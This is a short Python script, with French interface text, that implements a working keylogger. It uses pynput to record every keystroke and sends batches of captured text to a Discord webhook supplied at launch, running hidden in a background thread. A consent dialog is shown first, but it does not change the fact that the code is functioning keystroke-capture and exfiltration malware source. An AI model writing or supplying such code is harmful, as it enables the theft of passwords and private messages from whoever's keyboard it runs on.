import threading
from pynput import keyboard
import requests
import tkinter as tk
from tkinter import messagebox, simpledialog
import time

key_logs = []
WEBHOOK_URL = ""
keylogger_running = False

def send_to_discord(logs):
    global WEBHOOK_URL
    if not WEBHOOK_URL:
        return
    message = ''.join(logs)[-1500:]
    data = {"content": f"appes clavier :\n```{message}```"}
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass

def on_press(key):
    global key_logs
    try:
        key_logs.append(key.char)
    except AttributeError:
        key_logs.append(f"[{key.name}]")

    if len(key_logs) >= 20:
        send_to_discord(key_logs)
        key_logs.clear()

def start_keylogger():
    global keylogger_running
    keylogger_running = True
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def launch_keylogger():
    global WEBHOOK_URL

    root = tk.Tk()
    root.withdraw()  # Cache la fenêtre principale

    # Consentement explicite
    if not messagebox.askyesno("Consentement", 
        "⚠️ Ce programme enregistre toutes vos frappes clavier et les envoie au webhook Discord.\n"
        "Utilisez-le uniquement avec consentement explicite.\n"
        "Acceptez-vous de continuer ?"):
        messagebox.showinfo("Annulé", "Le programme va se fermer.")
        root.destroy()
        return

    # Demande du webhook
    WEBHOOK_URL = simpledialog.askstring("Webhook Discord", "Entrez le lien webhook Discord :")
    if not WEBHOOK_URL or not WEBHOOK_URL.startswith("https://discord.com/api/webhooks/"):
        messagebox.showerror("Erreur", "Lien webhook invalide. Fermeture du programme.")
        root.destroy()
        return

    messagebox.showinfo("Lancement", "Le keylogger va démarrer en arrière-plan.")
    root.destroy()

    threading.Thread(target=start_keylogger, daemon=True).start()

    # Maintenir le script actif en arrière-plan
    while True:
        time.sleep(10)

if __name__ == "__main__":
    launch_keylogger()
